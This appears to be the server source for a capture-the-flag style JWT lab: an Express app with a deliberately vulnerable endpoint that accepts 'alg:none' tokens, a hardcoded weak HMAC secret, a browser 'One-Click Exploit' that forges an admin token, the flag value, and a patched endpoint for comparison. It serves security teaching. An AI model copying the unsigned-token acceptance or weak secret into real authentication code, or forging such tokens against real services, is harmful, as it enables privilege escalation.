const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const app = express();
const PORT = process.env.PORT || 5004;

app.use(cors());
app.use(express.json());

const SECRET = 'weak_secret_123';

function b64url(str) {
  return Buffer.from(str).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
}
function decB64url(str) {
  return Buffer.from(str.replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString();
}
function hmacSign(data) {
  return crypto.createHmac('sha256', SECRET).update(data).digest('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
}

app.post('/api/login', (req, res) => {
  const { username } = req.body;
  const users = { alice: { id:1, role:'user' }, admin: { id:99, role:'admin' } };
  const u = users[username];
  if (!u) return res.status(401).json({ error: 'Unknown user. Try: alice or admin' });
  const header  = b64url(JSON.stringify({ alg:'HS256', typ:'JWT' }));
  const payload = b64url(JSON.stringify({ id:u.id, username, role:u.role, iat: Math.floor(Date.now()/1000) }));
  const sig = hmacSign(header + '.' + payload);
  res.json({ token: `${header}.${payload}.${sig}`, user: { username, role: u.role } });
});

app.post('/api/vulnerable/verify', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return res.status(400).json({ error: 'Invalid token format (need 3 parts)' });
    const header  = JSON.parse(decB64url(parts[0]));
    const payload = JSON.parse(decB64url(parts[1]));
    if (header.alg === 'none') {
      const flag = payload.role === 'admin' ? 'FLAG{jwt_none_algorithm_bypass}' : null;
      return res.json({ valid:true, bypassed:true, header, payload, message:'Algorithm confusion bypass! Role: ' + payload.role, flag });
    }
    const expected = hmacSign(parts[0] + '.' + parts[1]);
    if (expected !== parts[2]) return res.status(401).json({ valid:false, error:'Invalid signature' });
    res.json({ valid:true, bypassed:false, header, payload, message:'Valid token. Role: ' + payload.role });
  } catch(e) { res.status(400).json({ error: 'Parse error: ' + e.message }); }
});

app.post('/api/patched/verify', (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const parts = token.split('.');
    const header = JSON.parse(decB64url(parts[0]));
    if (header.alg === 'none') return res.status(401).json({ valid:false, error:'Algorithm "none" is not accepted by this server' });
    const expected = hmacSign(parts[0] + '.' + parts[1]);
    if (expected !== parts[2]) return res.status(401).json({ valid:false, error:'Signature verification failed' });
    const payload = JSON.parse(decB64url(parts[1]));
    res.json({ valid:true, payload, message:'Valid. Role: ' + payload.role });
  } catch(e) { res.status(400).json({ error: 'Parse error: ' + e.message }); }
});

const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>AuthService - JWT Lab</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  body { font-family: 'Inter', sans-serif; background: #0f172a; }
  .mono { font-family: 'JetBrains Mono', monospace; }
  pre { background: #1e293b; color: #94a3b8; padding: 1rem; border-radius: 8px; font-size: 0.75rem; overflow-x: auto; white-space: pre-wrap; }
  .flag { background: #fef9c3; border: 2px solid #eab308; color: #713f12; padding: 0.75rem; border-radius: 8px; font-family: monospace; font-weight: 700; }
</style>
</head>
<body class="min-h-screen text-gray-300 p-4 py-8">
<div class="max-w-4xl mx-auto space-y-6">

  <div class="text-center">
    <div class="inline-flex items-center gap-2 bg-slate-800 px-4 py-2 rounded-full mb-3">
      <span class="w-2 h-2 bg-green-400 rounded-full"></span>
      <span class="text-xs text-gray-400">AuthService v2.1</span>
    </div>
    <h1 class="text-2xl font-bold text-white">JWT Token Manipulation Lab</h1>
    <p class="text-gray-400 text-sm mt-1">Exploit the "none" algorithm vulnerability to forge an admin token</p>
  </div>

  <div class="bg-amber-900/30 border border-amber-600/40 rounded-xl p-4 flex gap-3">
    <span class="text-2xl flex-shrink-0">⚠️</span>
    <div>
      <p class="font-semibold text-amber-400 text-sm">JWT Alg:None Vulnerability</p>
      <p class="text-amber-300/70 text-xs mt-1">
        Step 1: Get a token as alice. Step 2: Click "One-Click Exploit" to auto-forge an admin token. Step 3: Submit it to get the flag.
      </p>
    </div>
  </div>

  <!-- Step 1 -->
  <div class="bg-slate-800 rounded-xl p-6 border border-slate-700">
    <h2 class="font-bold text-white mb-3 flex items-center gap-2">
      Step 1 — Get a Token
      <span class="text-xs bg-blue-900 text-blue-400 px-2 py-0.5 rounded">START HERE</span>
    </h2>
    <div class="flex gap-2 mb-3">
      <select id="login-user" class="flex-1 bg-slate-700 border border-slate-600 text-gray-200 rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500">
        <option value="alice">alice (role: user)</option>
        <option value="admin">admin (role: admin)</option>
      </select>
      <button id="get-token-btn" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded-lg text-sm font-medium transition-colors">Get Token</button>
    </div>
    <pre id="token-out" class="mono">// Click Get Token to start</pre>
  </div>

  <!-- Step 2 -->
  <div class="bg-slate-800 rounded-xl p-6 border border-slate-700">
    <h2 class="font-bold text-white mb-3">Step 2 — Forge the Token</h2>
    <div class="grid grid-cols-1 lg:grid-cols-3 gap-3 mb-4">
      <div>
        <label class="text-xs text-gray-400 block mb-1">Header (alg)</label>
        <textarea id="forge-header" rows="5" class="w-full bg-slate-900 border border-slate-600 text-yellow-400 mono rounded-lg px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-yellow-500 resize-none" placeholder='{"alg":"HS256","typ":"JWT"}'></textarea>
      </div>
      <div>
        <label class="text-xs text-gray-400 block mb-1">Payload (change role to admin)</label>
        <textarea id="forge-payload" rows="5" class="w-full bg-slate-900 border border-slate-600 text-cyan-400 mono rounded-lg px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-cyan-500 resize-none" placeholder='{"role":"user",...}'></textarea>
      </div>
      <div>
        <label class="text-xs text-gray-400 block mb-1">Signature (leave empty for alg:none)</label>
        <textarea id="forge-sig" rows="5" class="w-full bg-slate-900 border border-slate-600 text-red-400 mono rounded-lg px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-red-500 resize-none"></textarea>
      </div>
    </div>
    <div class="flex gap-2 flex-wrap mb-3">
      <button id="one-click-btn" class="text-sm bg-red-600 hover:bg-red-500 border border-red-500 text-white px-4 py-2 rounded transition-colors font-semibold">⚡ One-Click Exploit (alg:none + role:admin)</button>
      <button id="build-btn" class="text-xs bg-slate-700 hover:bg-slate-600 text-gray-300 px-3 py-1.5 rounded transition-colors">Build Token Manually</button>
    </div>
    <pre id="forged-token" class="mono text-xs">// Get a token first, then click One-Click Exploit</pre>
  </div>

  <!-- Step 3 -->
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
    <div class="bg-slate-800 rounded-xl p-5 border border-red-900/40">
      <h3 class="font-semibold text-white mb-3 text-sm flex items-center gap-2">
        🚨 Vulnerable Endpoint
        <span class="text-xs bg-red-900 text-red-400 px-2 py-0.5 rounded">accepts alg:none</span>
      </h3>
      <textarea id="v-token-input" rows="3" class="w-full bg-slate-900 border border-slate-600 text-gray-300 mono rounded-lg px-3 py-2 text-xs mb-2 focus:outline-none resize-none" placeholder="Forged token will appear here automatically..."></textarea>
      <button id="verify-vuln-btn" class="w-full bg-red-700 hover:bg-red-600 text-white py-2 rounded-lg text-sm font-medium mb-2 transition-colors">Submit to Vulnerable Endpoint</button>
      <pre id="v-verify-out">// Submit your forged token</pre>
      <div id="jwt-flag" class="flag hidden mt-3"></div>
    </div>
    <div class="bg-slate-800 rounded-xl p-5 border border-green-900/40">
      <h3 class="font-semibold text-white mb-3 text-sm flex items-center gap-2">
        ✅ Patched Endpoint
        <span class="text-xs bg-green-900 text-green-400 px-2 py-0.5 rounded">rejects alg:none</span>
      </h3>
      <textarea id="p-token-input" rows="3" class="w-full bg-slate-900 border border-slate-600 text-gray-300 mono rounded-lg px-3 py-2 text-xs mb-2 focus:outline-none resize-none" placeholder="Same token gets rejected here..."></textarea>
      <button id="verify-patch-btn" class="w-full bg-green-700 hover:bg-green-600 text-white py-2 rounded-lg text-sm font-medium mb-2 transition-colors">Submit to Patched Endpoint</button>
      <pre id="p-verify-out">// Same token — should be rejected</pre>
    </div>
  </div>
</div>

<script>
  function b64url(s) {
    return btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\\+/g,'-').replace(/\\//g,'_');
  }
  function decB64url(s) {
    try { return JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/'))))); }
    catch { return null; }
  }

  document.getElementById('get-token-btn').addEventListener('click', doLogin);
  document.getElementById('one-click-btn').addEventListener('click', oneClickExploit);
  document.getElementById('build-btn').addEventListener('click', buildToken);
  document.getElementById('verify-vuln-btn').addEventListener('click', verifyVuln);
  document.getElementById('verify-patch-btn').addEventListener('click', verifyPatched);

  async function doLogin() {
    const u = document.getElementById('login-user').value;
    try {
      const r = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: u })
      });
      const d = await r.json();
      if (d.token) {
        document.getElementById('token-out').textContent = 'Token: ' + d.token + '\\n\\nNow click One-Click Exploit below →';
        const parts = d.token.split('.');
        document.getElementById('forge-header').value  = JSON.stringify(decB64url(parts[0]), null, 2);
        document.getElementById('forge-payload').value = JSON.stringify(decB64url(parts[1]), null, 2);
        document.getElementById('forge-sig').value     = parts[2];
      } else {
        document.getElementById('token-out').textContent = JSON.stringify(d, null, 2);
      }
    } catch(e) {
      document.getElementById('token-out').textContent = 'Error: ' + e.message;
    }
  }

  function oneClickExploit() {
    const payloadStr = document.getElementById('forge-payload').value;
    if (!payloadStr.trim()) {
      document.getElementById('forged-token').textContent = '⚠️ Get a token first (Step 1), then click this button.';
      return;
    }
    let payload = {};
    try { payload = JSON.parse(payloadStr); } catch(e) {
      document.getElementById('forged-token').textContent = 'Error parsing payload: ' + e.message;
      return;
    }
    payload.role = 'admin';
    document.getElementById('forge-header').value  = JSON.stringify({ alg:'none', typ:'JWT' }, null, 2);
    document.getElementById('forge-payload').value = JSON.stringify(payload, null, 2);
    document.getElementById('forge-sig').value     = '';
    buildToken();
  }

  function buildToken() {
    try {
      const h   = JSON.parse(document.getElementById('forge-header').value);
      const p   = JSON.parse(document.getElementById('forge-payload').value);
      const sig = document.getElementById('forge-sig').value.trim();
      const token = b64url(JSON.stringify(h)) + '.' + b64url(JSON.stringify(p)) + '.' + (sig || '');
      document.getElementById('forged-token').textContent = token;
      document.getElementById('v-token-input').value = token;
      document.getElementById('p-token-input').value = token;
    } catch(e) {
      document.getElementById('forged-token').textContent = 'Error: ' + e.message + ' — make sure header and payload are valid JSON.';
    }
  }

  async function verifyVuln() {
    const token = document.getElementById('v-token-input').value.trim();
    if (!token) { document.getElementById('v-verify-out').textContent = 'Paste a token first.'; return; }
    try {
      const r = await fetch('/api/vulnerable/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      });
      const d = await r.json();
      document.getElementById('v-verify-out').textContent = JSON.stringify(d, null, 2);
      if (d.flag) {
        const fl = document.getElementById('jwt-flag');
        fl.textContent = '🏁 Flag: ' + d.flag + ' — copy this and submit in CyberLab!';
        fl.classList.remove('hidden');
      }
    } catch(e) { document.getElementById('v-verify-out').textContent = 'Error: ' + e.message; }
  }

  async function verifyPatched() {
    const token = document.getElementById('p-token-input').value.trim();
    if (!token) { document.getElementById('p-verify-out').textContent = 'Paste a token first.'; return; }
    try {
      const r = await fetch('/api/patched/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token })
      });
      const d = await r.json();
      document.getElementById('p-verify-out').textContent = (r.ok ? '✅ ' : '🚫 HTTP ' + r.status + ' — ') + JSON.stringify(d, null, 2);
    } catch(e) { document.getElementById('p-verify-out').textContent = 'Error: ' + e.message; }
  }
</script>
</body></html>`;

app.get('/', (req, res) => res.send(HTML));
app.listen(PORT, () => console.log(`🔑 JWT Lab running on http://localhost:${PORT}`));
